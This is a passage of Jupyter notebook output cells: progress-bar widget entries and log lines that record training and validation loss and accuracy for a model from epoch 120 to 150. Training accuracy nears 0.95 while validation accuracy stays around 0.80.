       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:03:51 | INFO | Epoch 120 | Train Loss: 0.3086 | Train Accuracy: 0.9345\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d52f781d62404c8b8b72d76a409b1985",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:03:53 | INFO | Validation Loss: 0.9982 | Validation Accuracy: 0.8131\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "796561fda55145a2b9b4b90a976c00c6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:04:11 | INFO | Epoch 121 | Train Loss: 0.2874 | Train Accuracy: 0.9403\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ca2f620f828b4641b120af4d331a41ca",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:04:13 | INFO | Validation Loss: 0.7676 | Validation Accuracy: 0.8453\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "994da42745b945489c3e6e5db03d59a0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:04:34 | INFO | Epoch 122 | Train Loss: 0.2977 | Train Accuracy: 0.9378\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5be3452836734b3aad0c3ff71f46d63b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:04:37 | INFO | Validation Loss: 0.9663 | Validation Accuracy: 0.8060\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "22c34e2b018a41fc97ed0ad72ceb241e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:04:56 | INFO | Epoch 123 | Train Loss: 0.2736 | Train Accuracy: 0.9425\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9f6ff41807354d74b0d69a53e92dd461",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:04:57 | INFO | Validation Loss: 1.0512 | Validation Accuracy: 0.7991\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3323b3c2ca4a4ddaaf7895634d541e3c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:05:18 | INFO | Epoch 124 | Train Loss: 0.2713 | Train Accuracy: 0.9428\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2e37dd916e544674acd7fecb41794787",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:05:20 | INFO | Validation Loss: 0.8972 | Validation Accuracy: 0.8189\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b0524644b9b645dc9460e30a75499ec5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:05:38 | INFO | Epoch 125 | Train Loss: 0.2774 | Train Accuracy: 0.9416\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3ada7b7735614c558a8c2b4cf75ab969",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:05:40 | INFO | Validation Loss: 0.9388 | Validation Accuracy: 0.8170\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4120a97dffcc490680091b964180c91d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:06:00 | INFO | Epoch 126 | Train Loss: 0.2685 | Train Accuracy: 0.9441\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "763c251b50e94fa0bb625d677d6021f6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:06:03 | INFO | Validation Loss: 0.9183 | Validation Accuracy: 0.8213\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "43c734b55eb943a9aadf5e655e23586d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:06:24 | INFO | Epoch 127 | Train Loss: 0.2510 | Train Accuracy: 0.9473\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0da9010f711d4e2ab43aba9f4334b02b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:06:26 | INFO | Validation Loss: 1.0077 | Validation Accuracy: 0.8172\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "242ea630018745b6b113f3997098e9d2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:06:44 | INFO | Epoch 128 | Train Loss: 0.2566 | Train Accuracy: 0.9464\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5603905f33074dd6912ea1039d336038",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:06:46 | INFO | Validation Loss: 0.7509 | Validation Accuracy: 0.8526\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ddf3957841b14e0cb9e8b38facfd1f96",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:07:05 | INFO | Epoch 129 | Train Loss: 0.2461 | Train Accuracy: 0.9484\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "dc3acb5921a947a4ac83abeed3a0cf87",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:07:07 | INFO | Validation Loss: 1.0975 | Validation Accuracy: 0.7987\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "186d80dc642e43e986ae2197520c6524",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:07:25 | INFO | Epoch 130 | Train Loss: 0.2533 | Train Accuracy: 0.9467\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "456133d16b0c48d8b0273c22c2a929ad",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:07:27 | INFO | Validation Loss: 0.8784 | Validation Accuracy: 0.8230\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d2d90045ab4a4748a78820af8ca8d58d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:07:46 | INFO | Epoch 131 | Train Loss: 0.2541 | Train Accuracy: 0.9462\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ec8b237f30a7471e8bed64f41e8e0943",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:07:48 | INFO | Validation Loss: 1.0978 | Validation Accuracy: 0.8053\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5006895063044a2a97582c9c665348de",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:08:05 | INFO | Epoch 132 | Train Loss: 0.2491 | Train Accuracy: 0.9477\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d81ec42920544cf693ba927e9b24f11d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:08:06 | INFO | Validation Loss: 1.1680 | Validation Accuracy: 0.7888\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1acbf0ad8f8546d7a9036dc2e6468908",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:08:22 | INFO | Epoch 133 | Train Loss: 0.2442 | Train Accuracy: 0.9481\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "431e78fc3d634e469018dc75a6e115ab",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:08:24 | INFO | Validation Loss: 0.9735 | Validation Accuracy: 0.8172\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6443aecea080472eb5aace3e09b4a1cc",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:08:49 | INFO | Epoch 134 | Train Loss: 0.2487 | Train Accuracy: 0.9472\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5913eb4967e7468abf442d575bec84d5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:08:50 | INFO | Validation Loss: 1.0285 | Validation Accuracy: 0.8033\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6d2ed93b16d74a479d61b684b22dc34d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:09:05 | INFO | Epoch 135 | Train Loss: 0.2321 | Train Accuracy: 0.9516\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b79b7defc81e4a8fae03b405e3fcac7d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:09:07 | INFO | Validation Loss: 1.0887 | Validation Accuracy: 0.8015\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f9a67e9fb7b241f0a1959d795fe9faec",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:09:22 | INFO | Epoch 136 | Train Loss: 0.2361 | Train Accuracy: 0.9500\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "75ed9b681ef24d11bc49a9adc0a971e1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:09:23 | INFO | Validation Loss: 1.0579 | Validation Accuracy: 0.8151\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "29291ec44e614761997e4a9173b07708",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:09:38 | INFO | Epoch 137 | Train Loss: 0.2523 | Train Accuracy: 0.9468\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "21fd7b9783154500b6184923822757c3",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:09:40 | INFO | Validation Loss: 1.1188 | Validation Accuracy: 0.7948\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2741d19440f24ad9943e78e789361d6f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:09:56 | INFO | Epoch 138 | Train Loss: 0.2366 | Train Accuracy: 0.9502\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d8c19d64e7e9466383c7144e6e2c324a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:09:57 | INFO | Validation Loss: 0.9807 | Validation Accuracy: 0.8135\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0d7bc151ace54296b495b3fd89f5ec62",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:10:13 | INFO | Epoch 139 | Train Loss: 0.2424 | Train Accuracy: 0.9488\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d8b2f9853afa443181bf5816087c64fe",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:10:15 | INFO | Validation Loss: 1.0928 | Validation Accuracy: 0.8042\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8da67ced147644a9b15ef11b64f7f537",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:10:31 | INFO | Epoch 140 | Train Loss: 0.2303 | Train Accuracy: 0.9516\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7b0b4472e0a446f4b8c3799718212c3c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:10:33 | INFO | Validation Loss: 1.0737 | Validation Accuracy: 0.8041\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "aa1b6221637047bb9548b911852932cd",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:10:49 | INFO | Epoch 141 | Train Loss: 0.2419 | Train Accuracy: 0.9490\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "094c7674e0544a8f8017422b9b95f32d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:10:51 | INFO | Validation Loss: 1.0749 | Validation Accuracy: 0.7998\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "61d60864f8144c3e82c05b2e1bb91f16",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:11:07 | INFO | Epoch 142 | Train Loss: 0.2254 | Train Accuracy: 0.9526\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2de4c668fc1e4049b63aa0821f88d4f7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:11:09 | INFO | Validation Loss: 1.0238 | Validation Accuracy: 0.8041\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b16645e4f55e44a08e05adb78f3b8556",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:11:25 | INFO | Epoch 143 | Train Loss: 0.2450 | Train Accuracy: 0.9486\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "044388517fa74a508fa906beee2884c0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:11:26 | INFO | Validation Loss: 1.0758 | Validation Accuracy: 0.7954\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "80d2bd7d03394550b1ba4c2b2b5fdd30",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:11:42 | INFO | Epoch 144 | Train Loss: 0.2413 | Train Accuracy: 0.9492\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "869afd2b80054332880dc978b33d6571",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:11:44 | INFO | Validation Loss: 1.0884 | Validation Accuracy: 0.8039\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "05a0d9cc29704d50975e20da50a8833c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:11:59 | INFO | Epoch 145 | Train Loss: 0.2435 | Train Accuracy: 0.9484\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "de36e8a97ea546f1aa25ee3b02949c45",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:12:01 | INFO | Validation Loss: 1.1361 | Validation Accuracy: 0.7970\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "28083d5ac0dc41fba71e744133b773ca",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:12:17 | INFO | Epoch 146 | Train Loss: 0.2422 | Train Accuracy: 0.9491\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "096d8689bc234f019f0724f97d98f774",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:12:18 | INFO | Validation Loss: 1.0401 | Validation Accuracy: 0.8130\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2acb3a2b4f2940c1864535bd01800c17",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:12:34 | INFO | Epoch 147 | Train Loss: 0.2569 | Train Accuracy: 0.9460\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "543c3c4d65c14e0883c68453561e0f50",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:12:36 | INFO | Validation Loss: 1.0097 | Validation Accuracy: 0.8098\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d6d5949a5f4b42239b774bcae9c20082",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:12:52 | INFO | Epoch 148 | Train Loss: 0.2431 | Train Accuracy: 0.9487\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d5f3feb7ca8b490e8d19230273781c7a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:12:54 | INFO | Validation Loss: 1.0587 | Validation Accuracy: 0.8087\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "25923890f07f4923ad2b56d987f54c65",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:13:10 | INFO | Epoch 149 | Train Loss: 0.2431 | Train Accuracy: 0.9486\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "19e5527d91e446b486620768370e02f5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:13:12 | INFO | Validation Loss: 1.0798 | Validation Accuracy: 0.8035\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6a4c48335a3049b2b66dedf5be90ab09",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:13:28 | INFO | Epoch 150 | Train Loss: 0.2548 | Train Accuracy: 0.9456\n"
     ]
    },
    {
     "data": {
